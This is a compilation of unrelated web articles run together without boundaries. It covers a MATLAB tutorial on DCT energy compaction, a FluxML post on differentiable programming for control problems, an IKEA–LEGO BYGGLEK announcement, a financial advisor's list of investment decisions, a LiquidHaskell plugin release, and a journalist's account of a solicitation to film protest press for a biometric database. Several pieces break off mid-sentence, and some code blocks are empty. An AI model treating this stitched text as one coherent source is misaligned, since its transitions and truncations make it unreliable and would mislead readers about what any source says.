DCT takes</p><ul><li>N data-points as its input</li><li>returns N data-points as its output</li><li>and ensures, that most of the information of the input is concentrated in only a few of the N output data-points.</li></ul><p>This is called the energy-compaction (or information compaction) property of the DCT.</p><p>Let’s understand this with an example using MATLAB.</p><p>Take an <code>8x8</code> matrix filled with the number <code>255</code> as shown below. If you need <code>8</code> bits to store each number, then you need <code>8 x 64 = 512</code> bits for storing the entire matrix. Good so far?</p><figure><img src="https://ottverse.com/images/input_255.png"></figure><p>Okay, now, let’s apply an <code>8x8</code> 2D-DCT to this matrix and get <code>8x8</code> DCT coefficients. They are shown below.</p><figure><img src="https://ottverse.com/images/coeffs_255.png"></figure><p>Looks different, doesn’t it?</p><p>If you notice carefully, the first coefficient (<code>[0, 0]</code>) element of the matrix is non-zero and the rest of the elements are zero. This greatly reduces the storage space needed for this matrix.</p><p>This is due to the de-correlating and energy compaction property of the DCT. This is usually described as follows in technical literature and can be a little difficult to understand -</p><blockquote><p><strong><em>the DCT has compacted the energy of the matrix into the first element referred to as the <code>DC</code> coefficient. The rest of the coefficients are called the <code>AC</code> coefficients.</em></strong></p></blockquote><p>What this is referring to is -</p><ul><li>the top-left corner of the output 2D DCT is called the DC coefficient. It is the most important output of the DCT and contains a lot of information about the original image.</li><li>the rest of the coefficients are called the AC coefficients. If you are transforming an image using the DCT, the AC coefficients contain finer details of the image.</li></ul><p>Now, if I take these DCT coefficients and apply an inverse-2D-DCT to it, I will get back the original coefficients.</p><p>If you want to try it out, here are the MATLAB commands to replicate the above experiment.</p><div><pre><code data-lang="matlab">inputPixels = <span>ones</span>(<span>8</span>,<span>8</span>) * <span>255</span>;

</code></pre></div><h2 id="application-of-dct-to-image--video-compression">Application of DCT to Image &amp; Video Compression</h2><p>The de-correlation and energy compaction properties of the DCT make it extremely attractive to image and video compression. The Karhunen–Loève transform (KLT) often referred to as the <em>ideal transform</em> has much better decorrelating properties but is computationally intractable. The DCT on the other hand, is easy to program and has captured the image and video compression world.</p><p>Here is a simple MATLAB <a href="https://in.mathworks.com/help/images/ref/dct2.html">script</a> that demonstrates the power of the 2D-DCT when applied to image compression (and, in extension to video compression).</p><div><pre><code data-lang="matlab"><span>% read an image (MATLAB provides a few sample images)</span>

<p>We’ve discussed the idea of <a href="https://fluxml.ai/2019/02/07/what-is-differentiable-programming.html">differentiable programming</a>, where we incorporate existing programs into deep learning models. This article shows what ∂P can bring to some simple but classic control problems, where we would normally use black-box Reinforcement Learning (RL). ∂P-based models not only learn far more effective control strategies, but also train orders of magnitude faster. The <a href="https://github.com/FluxML/model-zoo/tree/cdda5cad3e87b216fa67069a5ca84a3016f2a604/games/differentiable-programming">code</a> is all available to run for yourself – they will mostly train in a few seconds on any laptop.</p>

<h2 id="follow-the-gradient">Follow the Gradient</h2>

<p>Differentiation is what makes deep learning tick; given a function [[y = f(x)]] we use the gradient [[\frac{dy}{dx}]] to figure out how a change in [[x]] will affect [[y]]. Despite the mathematical clothing, gradients are actually a very general and intuitive concept. Forget the formulas you had to stare at in school; let’s do something more fun, like throwing stuff.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-basic.gif"></p>

<p>When we throw things with a trebuchet, our [[x]] represents a setting (say, the size of the counterweight, or the angle of release), and [[y]] is the distance the projectile travels before landing. If you’re trying to aim, the gradient tells you something very useful – whether a change in aim will increase or decrease the distance. To maximise distance, just follow the gradient.</p>

<p>Alright, but how can we get this magical number? The trick is a process called <a href="https://github.com/FluxML/Zygote.jl">algorithmic differentiation</a>, which is able to differentiate not only simple formulas like you learned in school, but also <em>programs</em> of any complexity – like our trebuchet simulator. The upshot is that we can take a <a href="https://github.com/Roboneet/Trebuchet.jl">simple simulator</a>, written in Julia and <a href="https://github.com/JuliaDiffEq/DifferentialEquations.jl">DiffEq</a> with no deep learning in mind, and get gradients for it in a single function call.</p>

</code></pre></div></div>

<p>Now we have that, let’s do something interesting with it.</p>

<h2 id="throwing-stuff">Throwing Stuff</h2>

<p>A simple way to use this is to aim the trebuchet at a target, using gradients to fine-tune the angle of release; this kind of thing is common under the name of <em>parameter estimation</em>, and we’ve <a href="https://julialang.org/blog/2019/01/fluxdiffeq">covered examples like it before</a>. We can make things more interesting by going meta: instead of aiming the trebuchet given a single target, we’ll optimise a neural network that can aim it given <em>any</em> target. Here’s how it works: the neural net takes two inputs, the target distance in metres and the current wind speed. The network spits out trebuchet settings (the mass of the counterweight and the angle of release) that get fed into the simulator, which calculates the achieved distance. We then compare to our target, and <em>backpropagate through the entire chain</em>, end to end, to adjust the weights of the network. Our “dataset” is a randomly chosen set of targets and wind speeds.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-flow.png"></p>

<p>A nice property of this simple model is that training it is <em>fast</em>, because we’ve expressed exactly what we want from the model in a fully differentiable way. Initially it looks like this:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-miss.gif"></p>

<p>After about five minutes of training (on a single core of my laptop’s CPU), it looks like this:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-hit.gif"></p>

<p>If you want to try pushing it, turn up the wind speed:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-wind.gif"></p>

<p>It’s only off by 16cm, or about 0.3%.</p>

<p>What about just aiming the trebuchet directly? It is easy to do this by gradient descent given that we have gradients. However, this is a slow iterative process that takes around 100ms each time. In contrast, running the neural network takes 5μs (twenty thousand times faster) with only a small loss in accuracy. This “approximate function inversion via gradients” trick is a very general one that can not only be used with dynamical systems, but also lies behind the <a href="https://github.com/lengstrom/fast-style-transfer">fast style transfer</a> algorithm.</p>

<p>This is about the simplest possible control problem, which we use mainly for illustrative purposes. But we can apply the same techniques, in more advanced ways, to classic RL problems as well.</p>

<h2 id="cart-meet-pole">Cart, meet Pole</h2>

<p>A more recognisable control problem is <a href="https://gym.openai.com/envs/CartPole-v0/">CartPole</a>, the “hello world” for reinforcement learning. The task is to learn to balance an upright pole by nudging its base left or right. Our setup is broadly similar to the trebuchet case: a <a href="https://github.com/tejank10/Gym.jl">Julia implementation</a> means we can directly treat the reward produced by the environment as a loss. ∂P allows us to switch seamlessly from model-free to model-based RL.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/cartpole-flow.png"></p>

<p>The astute reader may notice a snag. The action space for cartpole – nudge left or right – is discrete, and therefore not differentiable. We solve this by introducing a <em>differentiable discretisation</em>, defined <a href="https://github.com/FluxML/model-zoo/blob/cdda5cad3e87b216fa67069a5ca84a3016f2a604/games/differentiable-programming/cartpole/DiffRL.jl#L32">like so</a>:</p>

<p>$[[\begin{aligned}
  f(x) &amp;=
    \begin{cases}
    1 &amp; x \ge 0 \\
    -1 &amp; x &lt; 0
    \end{cases} \\
  \frac{df}{dx} &amp;= 1
\end{aligned}]]</p>

<p>In other words, we force the gradient to behave as if [[f]] were the identity function. Given how much the mathematical idea of differentiability already gets abused in ML, it’s perhaps not surprising that we can just cheat here; for training all we need is a signal to inform our pseudo-random walk around parameter space, and the rest is details.</p>

<p>The results speak for themselves. Where RL methods need to train for hundreds of episodes before solving the problem, the ∂P model only needs around 5 episodes to win conclusively.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/cartpole.gif"></p>

<h2 id="the-pendulum--backprop-through-time">The Pendulum &amp; Backprop through Time</h2>

<p>An important aim for RL is to handle <em>delayed reward</em>, when an action doesn’t help us until several steps in the future. ∂P allows this too, and in a very familiar way: when the environment is differentiable, we can actually train the agent using backpropagation through time, just like a recurrent net! In this case the environmental state becomes the “hidden state” that changes between time steps.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/bptt.png"></p>

<p>To demonstrate this technique we looked at the <a href="https://github.com/openai/gym/wiki/Pendulum-v0">pendulum</a> environment, where the task is to swing a pendulum until it stands upright, keeping it balanced with minimal effort. This is hard for RL models; after around 20 episodes of training the problem is solved, but often the route to a solution is visibly sub-optimal. In contrast, BPTT can beat the <a href="https://github.com/openai/gym/wiki/Leaderboard#pendulum-v0">RL leaderboard</a> in <em>a single episode of training</em>. It’s instructive to actually watch this episode unfold; at the beginning of the recording the strategy is random, and the model improves over time. The pace of learning is almost alarming.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/pendulum-training.gif"></p>

<p>Despite only experiencing a single episode, the model generalises well to handle any initial angle, and has something pretty close to the optimal strategy. When restarted the model looks more like this.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/pendulum-dp.gif"></p>

<p>This is just the beginning; we’ll get the real wins applying DP to environments that are too hard for RL to work with at all, where rich simulations and models already exist (as in much of engineering and the sciences), and where interpretability is an important factor (as in medicine).</p>

<h2 id="the-map-is-not-the-territory">The Map Is Not The Territory</h2>

<p>The limitation of these toy models is that they equate the simulated training environment with the test environment; of course, the real world is not differentiable. In a more realistic model the simulation gives us a coarse outline of behaviour that is refined with data. That data informs (say) the simulated effect of wind, in turn improving the quality of gradients the simulator passes to the controller. Models can even form part of a controller’s forward pass, enabling it to refine its predictions without having to learn system dynamics from scratch. Exploring these new architectures will make for exciting future work.</p>

<h2 id="coda">Coda</h2>

<p>The core idea is that <em>differentiable programming</em>, where we simply write an arbitrary numerical program and optimise it via gradients, is a powerful way to come up with better deep learning-like models and architectures – especially when we have a large library of differentiable code to hand. The toy models described are really only previews, but we hope they give an intuition for how these ideas can be applied in more realistic ways.</p>

<p>Just as functional programming involves reasoning about and expressing algorithms using functional patterns, differentiable programming involves expressing algorithms using differentiable patterns. Many such design patterns have already been developed by the deep learning community, such as for handling control problems or sequence and tree structured data. As the field matures, many more will be invented, and the resulting programs are likely to make even the most advanced current deep learning architectures look crude by comparison.</p>

<p>My sources also tell me that there is also a play-table with studs on the surface and drawers beneath to keep your loose bricks which are great for kids to explore their creativity as well as keeping the place tidy.</p>
<p>The launch for Bygglek is slated to be in October 2020 but a lot of things are in flux now due to the covid-19 pandemic.</p>
<p>Stay tuned!</p>

<p><strong>Playing is crucial for the well-being of both adults and children. Together, LEGO Group and IKEA explore and develop solutions to stimulate play all around the home. The collaboration will result in BYGGLEK.</strong></p>
<p>One year ago, IKEA and LEGO Group&nbsp;partnered up to be creative, exchange knowledge and experiment together with the ambition to develop new solutions to facilitate play in every corner of the home. Research from IKEA and LEGO Group has shown that there’s a demand among children for more playtime with their parents. At the same time, parents believe that playing is essential to their children’s well-being and happiness. Despite this, children and adults encounter several barriers and challenges when it comes to making play happen. Busy schedules and homework are a couple of obstacles, other restrictions like finding the space to play are more evident for adults than for children.</p>
<p>“There’s a conflict between how grown-ups look at organising and how children look at the creative play. Every grown-up has stepped on a Lego brick at night time. But organising LEGO bricks the grown-up way also means ending the play sometimes. Adults sort by typology – socks going into one drawer and belts into another. Kids sort by story, clustering it into different pieces, where you can have a half-built space ship. And in that, you can find the one piece that you need. What if we could turn that perceived mess into something wonderful?”, says Rasmus Buch Løgstrup, designer at LEGO Group.</p>
<p>The different perspectives might lead to that children experience rules, carried out by their parents, stops them from being as creative and playful as they wish. Parents, on the other hand, feel that playing can be a bit too messy at home, making it harder to fulfil other commitments of the everyday. The overlaying ambition between the collaboration between LEGO Group and IKEA is to overcome these kinds of obstacles. The hope is to move away from “no” to “yes” to play, and at the same time show respect to duties of the everyday.</p>
<p>“To do this, systematic thinking becomes key. We know that children continue the story building in their minds long after they have stopped playing with their toys. So we asked ourselves, couldn’t pause and play be a way to enable quick play? We know that children are playing with screens because it’s easy to get started. So what if we could make the LEGO play continue? That would make quick play easier and then build on the play that is continuing in the child’s mind anyway”, says Andreas Fredriksson, designer at IKEA.</p>
<p>To enable playing throughout the home with pauses, a solution across generations is needed. Also, different rooms need different solutions that can change after different phases in life.</p>
<p>“Bringing people together over play and enable more play are things that are key for both us and LEGO Group&nbsp;based on our respective visions, missions and values. That is why we want to explore what can happen when we work together, trying to get more of the many people to say yes to play”, says Andreas Fredriksson, designer at IKEA.</p>
<p>The aim is to sale start the first BYGGLEK products during 2020.</p>

            <p>If you're about to make an serious financial move--either rolling over your 401k, deciding to retire, or maybe selling your business or deploying an inheritance--you have some important investment decisions to make. &nbsp;What are the biggest considerations before you move forward? &nbsp;I believe there are five decisions you have to think through carefully to achieve the best investment and financial experience. &nbsp;</p><p>Yet most people don't know where to begin and I don't remember, in 22 years of working as a financial advisor, <em><strong>ever</strong></em> talking to someone who understood or had evaluated all of them. &nbsp;So let me outline the five investment decisions that really matter, step by step:</p><p><span><span><strong>#1 --</strong></span><em><span><strong>&nbsp;</strong></span><span><strong>I</strong></span><span><strong>nvest or Sit on the Sidelines?</strong></span></em></span></p><p>This should be an obvious one but it really isn't. &nbsp;I see way too many people with an exorbitant amount of money in savings and money market accounts. &nbsp;These are good parking places for 6-18 months of living expenses, as well as a big ticket purchase you might make in the next three years, such as the down payment on a new house. &nbsp;For all your excess savings, you need to invest it in longer-term, growth and income assets. &nbsp;Simply moving from cash (One-Month T-Bills) to a bond fund has historically netted you about 3% per year in additional returns. &nbsp;The decision to invest with money you can afford to set aside for more than a year or two is crucial. &nbsp;Guessing that the market will go down and you'll be able to get in at a better point is unlikely.</p><p><img src="https://static.fmgsuite.com/media/images/e995d0cf-ea76-46c4-aa43-a02306df857d.jpg" data-id="7da2e5ec-e11a-4ebf-8ee0-5467fdcf0324"></p><p><img src="https://static.fmgsuite.com/media/images/58496942-52f6-41a6-aceb-db6ef2b86ef3.jpg" data-id="7c3031dd-8f7e-471a-ae51-831bb8a6f51e"></p><p><span><strong>#2 -- <em>Be An "Owner" Or a "Loaner"?</em></strong></span></p><p>When you buy bonds, you are loaning out your savings to the government or a corporation in return for an agreed upon rate of interest over a pre-set period of time. &nbsp;That's been better than keeping your money in cash, but it hasn't done as well as taking an ownership stake in a business, which is exactly what you're doing when you purchase a share of stock. &nbsp;You become a small fractional owner in the company, and are entitled to your share of earnings growth (through share price appreciation) and dividends. &nbsp;Over time, owning stocks instead of bonds has created significantly greater wealth -- just as the decision to simply invest as opposed to keeping your money in cash has netted you almost 3% a year higher returns, investing in the US stock market (the Vanguard CRSP 1-10 Index) has also netted you an additional 3% in returns compared to a bond index.</p><p><img src="https://static.fmgsuite.com/media/images/79cbc2fe-5090-4fc8-a5e1-68a9169bba71.jpg" data-id="f50dc679-f207-4bec-ac06-8c70c11afec5"></p><p><img src="https://static.fmgsuite.com/media/images/4dbaaa6e-a76c-42c1-89b8-401e1db4756b.jpg" data-id="df0f6950-34ff-46ae-be23-31e60ed697ad"></p><p><span><strong>#3 -- <em>Which Stocks Should You Buy?</em></strong></span></p><p>The stock market is dominated by the largest and highest-priced companies. &nbsp;This means that you get a relatively small amount of earnings for each share you own. &nbsp;What's more, due to the intense competition in free market economies, large successful companies have a difficult time maintaining their leadership positions. &nbsp;Over time, smaller and less successful companies with low prices and low past/current earnings have been able to reinvent themselves, boost profitability, and take leadership away from the giant bureaucracies that get all the attention. &nbsp;The result is that smaller and lower-priced value stocks have delivered much greater long-term returns than a large cap growth-dominated market index. &nbsp;To get the most bang for your buck from your stock investments, you need to emphasize the asset classes with the higher expected returns: small cap and value stocks. &nbsp;</p><p><strong>Over time, the decision to favor small value stocks over the large growth stocks that dominate a basic stock market index fund has led to over 4% per year higher returns -- a bigger return advantage than the stock/bond decision!&nbsp;</strong></p><p><strong><img src="https://static.fmgsuite.com/media/images/1dfb17fb-fa81-48a7-859c-6849f7bf32d5.jpg" data-id="0daa0886-3d4e-43a2-998c-101803f0b3c5"></strong></p><p><img src="https://static.fmgsuite.com/media/images/6758639f-d22c-419f-84eb-85c75654cdcc.jpg" data-id="61d39632-9d04-4330-aeee-dc26deb7eb93"></p><p><span><strong>#4 -- <em>Should You</em>&nbsp;<em>Diversify Globally or Keep All Your Eggs In One Basket?</em></strong></span></p><p>Despite the much higher returns generated by small cap value stocks compared to the basic stock market index over time, you shouldn't bet the farm on any one asset class. &nbsp;Diversification across different asset classes can produce higher long-term returns without commensurately higher risk. &nbsp;Instead of just investing in US stocks, you should spread your portfolio out amongst US and non-US stocks, emphasizing smaller and more value-oriented companies in each region. &nbsp;An example of a portfolio that is well diversified across large/small and growth/value stocks in US and non-US markets is the DFA Global Equity Index.</p><p>Looking at the table below, we find that the <strong>DFA Global Equity Index's return of +12.5% per year was over 2% annually higher than the Vanguard CRSP 1-10 US Stock Index</strong>, without additional risk (standard deviation)! &nbsp;Broad diversification is the only free lunch you'll find in investing.</p><p><img src="https://static.fmgsuite.com/media/images/03bf1442-8c8e-483e-ad2c-3b4a5158c0ec.jpg" data-id="448433b8-c023-4b1f-ba9f-8c3504e32c8e"></p><p><img src="https://static.fmgsuite.com/media/images/7d31f374-1c2e-4755-a1f4-1e71a9bfdb9e.jpg" data-id="3c590b2d-87b7-4a5f-be58-26b7e7219deb"></p><p><span><strong><span>#5 -- <em>What's The Best Asset Allocation For You?</em></span></strong></span></p><p>Having learned how to invest to earn the highest long-term returns without taking unnecessary risk, it's now time to decide how much return you will need and how much volatility and (unpredictable) short-term loss you are willing to accept to achieve that return. &nbsp;Fortunately, once you understand the right way to invest, all of the options are good; there are no wrong decisions. &nbsp;Instead they are tradeoffs -- more pain = more expected gain, and vice versa. &nbsp;</p><p>(a) For maximum growth, you can choose an all-stock portfolio, such as the DFA Global Equity Index, with much greater long-term returns and stock market index-like risk.</p><p>(b) You could add a small amount (20%) in investment grade bonds and still expect to earn future returns greater than a US stock index thanks to the 80% that remains in stocks, but with less variability. &nbsp;</p><p>(c) Or you could opt for a standard retirement allocation, 60% stocks and 40% bonds. &nbsp;This balanced portfolio, with higher expected returning stocks, has historically earned a slightly better return than the US stock market index (which is dominated by the largest growth stocks). &nbsp;But with 40% less volatility and milder short-term declines.</p><p><img src="https://static.fmgsuite.com/media/images/25278bad-49c7-4abf-a7dc-b9aca9d637b8.jpg" data-id="3d9ad38e-db5d-4eff-a5d2-4eb6e23799b6"></p><p><img src="https://static.fmgsuite.com/media/images/8fd53e40-d29f-4336-9436-319123341bd4.jpg" data-id="47f8d0ca-4845-494a-9b84-20296ceb79ef"></p><p>Whichever allocation you choose, the most important thing is to<strong> stick with your portfolio through ups and downs</strong>. &nbsp;Getting in and out at the wrong time could cause you to miss several % a year in potential gains and could put you at risk of failing to achieve your goals. &nbsp;Once you've chosen your path, you've gotta stay the course. &nbsp;</p><p>Unfortunately, most investors have a hard time sitting tight when headlines turn scary, which is why hiring a full-time, independent financial advisor to help you design the right portfolio for your unique goals and work with you to stay the course could be another great decision.</p><p>___________________________________________________________</p><p><strong>DFA Global

<p>I enjoy working with LH. However, I’d be the very first to confess that it has been incredibly tedious to get to work on <em>existing</em> code bases, for various reasons.</p>
<ol type="1">
<li><p>LH ran <em>one file at a time</em>; it was a hassle to <strong>systematically analyze</strong> all the modules in a single package.</p></li>
<li><p>LH had <em>no notion of packages</em>; it was impossible to <strong>import specifications</strong> across packages.</p></li>
<li><p>LH had <em>no integration</em> with the standard compilation cycle; it was difficult to get robust, <strong>development-time feedback</strong> using <code>ghci</code> based tools.</p></li>
</ol>
<p>I’m delighted to announce the release of <a href="http://ucsd-progsys.github.io/liquidhaskell/">LH version 0.8.10.2</a>.</p>
<p>Thanks to the ingenuity and tireless efforts of our friends <a href="http://www.alfredodinapoli.com/">Alfredo Di Napoli</a> and <a href="https://www.andres-loeh.de/">Andres Loh</a> at <a href="http://www.well-typed.com/">Well-Typed</a> this new version solves all three of the above problems in a single stroke, making it vastly simpler (dare I say, quite straightforward!) to run LH on your Haskell code.</p>
<!-- more -->
<p>Alfredo and Andres’ key insight was that all the above problems could be solved if LH could be re-engineered as a <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/extending_ghc.html#compiler-plugins">GHC Compiler Plugin</a> using hooks that GHC exposes to integrate external checkers during compilation. I strongly encourage you to check out Alfredo’s talk at the <a href="https://icfp20.sigplan.org/details/hiw-2020-papers/1/Liquid-Haskell-as-a-GHC-Plugin">Haskell Implementor’s Workshop</a> if you want to learn more about the rather non-trivial mechanics of how this plugin was engineered. However, in this post, lets look at <em>how</em> and <em>why</em> to use the plugin, in particular, how the plugin lets us</p>
<ol type="1">
<li><p>Use GHC’s dependency resolution to analyze entire packages with minimal recompilation;</p></li>
<li><p>Ship refined type specifications for old or new packages, and have them be verified at client code;</p></li>
<li><p>Use tools like <code>ghci</code> based IDE tooling (e.g.&nbsp;<code>ghcid</code> or <code>ghcide</code> to get interactive feedback),</p></li>
</ol>
<p>all of which ultimately, I hope, make Liquid Haskell easier to use.</p>
<h2 id="analyzing-packages">1. Analyzing Packages</h2>
<p>First, lets see a small “demo” of how to <em>use</em> the plugin to compile a small <a href="https://github.com/ucsd-progsys/lh-plugin-demo"><code>lh-plugin-demo</code></a> package with two modules</p>

<p>which defines a function <code>incr</code> that consumes and returns positive integers, and</p>

<p>which imports <code>Demo.Lib</code> and uses <code>incr</code>.</p>
<h3 id="updating-.cabal-to-compile-with-the-lh-plugin">Updating <code>.cabal</code> to compile with the LH plugin</h3>
<p>To “check” this code with LH we need only tell GHC to use it as a plugin, in two steps.</p>
<ol type="1">
<li>First, adding a dependency to LH in the <code>.cabal</code> file (or <code>package.yaml</code>)</li>
</ol>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell &gt;= 0.8.10</code></pre>
<ol start="2" type="1">
<li>Second, tell GHC to use the plugin</li>
</ol>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>That’s it. Now, everytime you (re-)build the code, GHC will <em>automatically</em> run LH on the changed modules! If you use <code>stack</code> you may have to specify a few more dependencies, as the various packages are not (yet) on stackage, as shown in the <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml">demo <code>stack.yaml</code></a>. No extra dependencies are needede if you use <code>cabal-v2</code>. In both cases, you can use the respective files <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml.github"><code>stack.yaml</code></a> and <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/cabal.project.github"><code>cabal.project</code></a> point to specific git snapshots if you want to use the most recent versions. If you clone the repo and run, e.g.&nbsp;<code>cabal v2-build</code> or <code>stack build</code> you’ll get the following result, after the relevant dependencies are downloaded and built of course…</p>

<h3 id="benefits">Benefits</h3>
<p>There are a couple of benefits to note immediately</p>
<ul>
<li><p>A plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the installing <em>and</em> checking!</p></li>
<li><p>No need to separately <em>install</em> LH; its part of the regular build.</p></li>
<li><p>GHC’s recompilation machinery ensures that only the relevant modules are checked, e.g.&nbsp;the second time round, LH did not need to analyze <code>Lib.hs</code> only <code>Client.hs</code></p></li>
</ul>
<h2 id="shipping-specifications-with-packages">2. Shipping Specifications with Packages</h2>
<p>While the above is nice, in principle it could have been done with some clever <code>makefile</code> trickery (perhaps?). What I’m much more excited about is that now, for the first time, you can <em>ship refinement type specifications within plain Haskell packages</em>.</p>
<p>For example, consider a different <a href="https://github.com/ucsd-progsys/lh-plugin-demo-client">lh-plugin-demo-client</a> package that uses <code>incr</code> from <code>lh-plugin-demo</code>:</p>

<p>Again, the <code>lh-plugin-demo-client.cabal</code> file need only specify the various dependencies:</p>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell,
      lh-plugin-demo</code></pre>
<p>and that GHC should use the plugin</p>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>and lo! a plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the rest.</p>

<h3 id="prelude-specifications">Prelude Specifications</h3>
<p>Did you notice the strange <code>liquid-base</code> dependency in the cabal files?</p>
<p>Previously, LH came installed with a “built-in” set of specifications for various <code>prelude</code> modules. This was <em>hacked</em> inside LH in a rather unfortunate manner, which made these specifications very difficult to extend.</p>
<p>Moving forward, all the refinement specifications e.g.&nbsp;for <code>GHC.List</code> or <code>Data.Vector</code> or <code>Data.Set</code> or <code>Data.Bytestring</code> simply live in packages that <em>mirror</em> the original versions, e.g.&nbsp;<code>liquid-base</code>, <code>liquid-vector</code>, <code>liquid-containers</code>, <code>liquid-bytestring</code>. Each <code>liquid-X</code> package directly <em>re-exports</em> all the contents of the corresponding <code>X</code> package, but with any additional refinement type specifications.</p>
<p>Thus, all the refined types for various prelude operations like <code>(+)</code> or <code>(-)</code> or <code>head</code> and so on, now ship with <code>liquid-base</code> and we add that dependency <strong>instead of</strong> base. Similarly, if you want to verify that <em>your</em> code has no <code>vector</code>-index overflow errors, you simply build with <code>liquid-vector</code> <strong>instead of</strong> <code>vector</code>! Of course, in an ideal, and hopefully not too distant future, we’d directly include the refinement types inside <code>vector</code>, <code>containers</code> or <code>bytestring</code> respectively.</p>
<h3 id="benefits-1">Benefits</h3>
<p>So to recap, the plugin offers several nice benefits with respect to <em>shipping specifications</em></p>
<ul>
<li><p>Refined signatures are bundled together with packages,</p></li>
<li><p>Importing packages with refined signatures automatically ensures those signatures are checked on client code,</p></li>
<li><p>You can (optionally) use refined versions of <code>prelude</code> signatures, and hence, even write refined versions of your favorite <em>custom preludes</em>.</p></li>
</ul>

<p>I saved <em>my</em> favorite part for the end.</p>
<p>What I have enjoyed the most about the plugin is that now (almost) all the GHC-based tools that I use in my regular Haskell development workflow, automatically incorporate LH too! For example, reloading a module in <code>ghci</code> automatically re-runs LH on that file.</p>
<h3 id="ghcid"><code>ghcid</code></h3>
<p>This means, that the mega robust, editor-independent <code>ghcid</code> now automatically produces LH type errors when you save a file. Here’s <code>ghcid</code> running in a terminal.</p>

<p>While covering Portland protests as an independent journalist, being filmed while working has never really bothered me. My full name and a photo of me is available publicly and, honestly, I’m much more concerned with protecting myself from riot control agents like tear gas and impact munitions used by Portland police.</p>



<p>For others in the crowd, however, protecting themselves from being filmed is a necessity. In the hands of the wrong people, footage exposing their identity can be (and is) used to threaten them online and commit very real acts of violence against them and their acquaintances. It can cause people to lose their jobs and their homes, depending on how their employers and landlords feel about what they’re doing in the footage. (There is a reason so many protesters dress in head-to-toe black, and why some people walk through the crowd with black umbrellas to block people’s phones as they attempt to film the crowd.)</p>



<p>That’s why, when I received the following email on Tuesday, Aug. 18, at 11:41 p.m. from cryptonater@protonmail.com, my stomach dropped:</p>

<p>(<a href="https://catalinagaitancom.files.wordpress.com/2020/08/cryptonater-1.docx" target="_blank" rel="noreferrer noopener">Text version of email available here</a>.)</p>



<p>Someone with the username “Cryptonater” was asking me if I’d like to receive payment in exchange for taking photos and videos of faces of members of the press at Portland protests — specifically “pro-Antifa press and those posing as press.” According to their email, their objective was to create a database of people whose faces I recorded, then perform background checks and “analysis” on them.</p>



<p>I took a screenshot of the email and sent it to a group chat of fellow journalists, asking — essentially — “what the fuck?” No journalist with a <em>modicum </em>of integrity would ever participate in an agreement like this. It goes against a commonly shared journalistic code of ethics (and I was fairly certain was unconstitutional, if connected in any way to a governmental agency). </p>



<p>After discussing the email with the group, I decided to reply to the email first before sharing it with fellow journalists on Twitter. The goal was to see what additional information Cryptonater would send me before they inevitably realized I wasn’t down to secretly surveil people. </p>



<p>On Wednesday, Aug. 19, I replied, asking Cryptonater what other opportunities they were offering:</p>

<p> (<a href="https://catalinagaitancom.files.wordpress.com/2020/08/cata-reply-1-1.docx" target="_blank" rel="noreferrer noopener">Text version of email available here</a>.)</p>



<p>Then I waited. While waiting, I wondered why Cryptonater had chosen to email me. Was it because I had a relatively low follower count on Twitter? Was it because, only a day prior, I had posted a tweet (okay, <em>complained</em>) about news outlets requesting to use my reporting without payment? (Fact: being credited by Good Morning America might feel sweet, but it does not pay to refill your prescriptions.) Was Cryptonater just a troll with too much time on their hands?</p>



<p>By Aug. 20, I figured Cryptonater had given up on hiring me, so I posted their original email and my reply to Twitter: </p>

<p>Almost immediately, responses started coming in, including worried replies from other people covering Portland protests. Twitter users were tagging the American Civil Liberties Union (ACLU) and Society of Professional Journalists. The most common replies were iterations of “this is disturbing” and “what the fuck?”</p>



<p>After sending the tweet, I figured I had finished the task of making fellow members of the press aware that someone was trying to watch them (or at least claiming to). I also gave up on ever hearing back from Cryptonater.</p>



<p>Then, at 11:16 a.m. the following day, I received a response:</p>

<p>(<a href="https://catalinagaitancom.files.wordpress.com/2020/08/cryptonater-2.docx" target="_blank" rel="noreferrer noopener">Text version of email available here</a>.)</p>



<p>This lengthy (605-word) email from Cryponator can be distilled into 10 key points: </p>



<ol><li>An organization was claiming to be building a national database of people at protests, specifically those identifying themselves as press but not employed by a news organization; </li><li>They’re already doing this by scraping footage from social media feeds like Facebook, Twitter, Periscope, Twitch and Instagram;</li><li>They’re working on a “biometrics algorithm” that can identify people based on “walking style, filming style, voice, facials, build, and other identifying marks like tattoos;”</li><li>This information is being bundled for sale to law enforcement, Department of Homeland Security and Department of Defense;</li><li>They are paying $20 per minute of footage (amounting to ~$10,000 for nine hours of protest coverage);</li><li>If willing to travel to other cities, that payment doubles to $40 per minute for footage and includes paying for travel costs and 50% payment upfront;</li><li>Hirees must sign an non-disclosure agreement;</li><li>The organization provides medical and liability insurance for any injuries sustained;</li><li>Their stated goal is to “deconstruct extremism by identification and then neutralization” (<em>WHAT DOES “neutralization” MEAN?</em>) of “pseudo-press” and individuals who engage in “rioting and crime;”</li><li>They already have freelances filming at protests around the country and are seeking to expand their teams in Portland and Seattle.</li></ol>



<p>This email prompted two responses. First,<em> I want to throw up</em>. Second, there’s no way this is for real. Who has this kind of money? What organization could possibly think they could get away with this? And, if in cooperation with Portland Police Bureau, this would be <em>super illegal</em>. </p>



